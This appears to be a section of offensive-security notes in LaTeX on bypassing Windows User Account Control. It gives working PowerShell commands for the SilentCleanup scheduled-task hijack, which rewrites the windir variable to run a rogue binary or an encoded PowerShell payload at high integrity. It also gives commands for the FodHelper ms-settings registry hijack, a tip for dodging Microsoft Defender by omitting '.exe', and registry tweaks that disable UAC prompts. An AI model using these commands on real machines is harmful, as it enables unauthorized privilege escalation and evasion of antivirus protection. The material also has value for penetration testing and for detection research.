\section{UAC}
See~\ref{mitre:t1548.002}

There exists lot of way to bypass UAC. 

{\bf Disabling UAC with \verb+enableLUA+  value requieres  a reboot}.

try with \verb+ConsentPromptBehaviorAdmin+ value to 0



\subsection{DiskCleanup Scheduled Task Hijack}

The interesting thing about this scheduled task, is that it may be started from a process with a medium integrity level, and then automatically elevates to a high integrity level since the "Run with highest privileges" option is enabled.

\begin{verbatim}
Get-ScheduledTask SilentCleanup |Export-ScheduledTask
...
<RunLevel>HighestAvailable</RunLevel>
...
  <Actions>
    <Exec>
      <Command>%windir%\system32\cleanmgr.exe</Command>
      <Arguments>/autocleanstoragesense /d %systemdrive%</Arguments>
    </Exec>
  </Actions>
....
\end{verbatim}

since command include \verb+%windir%+ the env var can be modify to launch another process with high integrity level

\begin{verbatim}
Set-ItemProperty -Path "HKCU:\Environment" -Name "windir" -Value "cmd.exe /K <rogue_bainary> <rogue_binary_args> & REM " -Force
Start-ScheduledTask -TaskPath "\Microsoft\Windows\DiskCleanup" -TaskName "SilentCleanup"
Clear-ItemProperty -Path "HKCU:\Environment" -Name "windir" -Force
\end{verbatim}

{\bf Note:} \verb+REM+ is internal to the command-line interpreter \verb+cmd.exe+ the indicates a comment

therefore the binary will be interpreted as
\begin{verbatim}
cmd.exe /K <rogue_bainary> <rogue_binary_args> & REM \system32\cleanmgr.exe ...
\end{verbatim}

To try: launch a \verb+powershell.exe -executionpolicy Bypass -encodedCommand <base64enc> & REM+

\subsection{FodHelper Execution Hijack}
very well-known attacker vector and Windows Defender Antivirus does a relatively good job of detecting it. That being said, the technique still works, and it is not so hard to avoid getting detected.

The default Windows program \verb+C:\Windows\System32\fodhelper.exe+ has an attribute called \verb+AutoElevate+, which makes it so that when it is run by a user at a medium integrity level, it is automatically elevated to a high integrity level.

with Sysinternals:
\begin{verbatim}
.\sigcheck.exe -m C:\Windows\System32\fodhelper.exe | findstr autoElevate
\end{verbatim}

When FodHelper is run, it attempts to read the value of the registry key \verb+HKCU\Software\Classes\ms-settings\Shell\Open\Command+. Registry keys ending with \verb+Shell\Open\Command+ are used to tell Windows how to open various file types.

Traditionally, the bypass was to set \verb+HKCU\Software\Classes\ms-settings\Shell\Open\command+ to whatever command we wanted to run, however nowadays Microsoft Defender Antivirus will kill the process as soon as you write to this key:

\begin{verbatim}
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" \
    -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" \
    -Name "(default)" -Value "cmd.exe" -Force
\end{verbatim}

Microsoft Defender Antivirus is only triggered when it senses \verb+.exe+ in the value being set, so if you simply remove the \verb+.exe+ you will not get blocked.


Clean:
\begin{verbatim}
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
\end{verbatim}


\subsection{Tools}

\subsubsection{WinPwnage}
\href{https://github.com/rootm0s/WinPwnage}{WinPwnage} contains Python implementations of 15 different vectors.

\subsection{Links}

\begin{itemize}
    \item 
        \href{https://www.elastic.co/security-labs/exploring-windows-uac-bypasses-techniques-and-detection-strategies}{Exploring Windows UAC Bypasses: Techniques and Detection Strategies}
    \item
        \href{https://github.com/hfiref0x/UACME}{UACME}
\end{itemize}
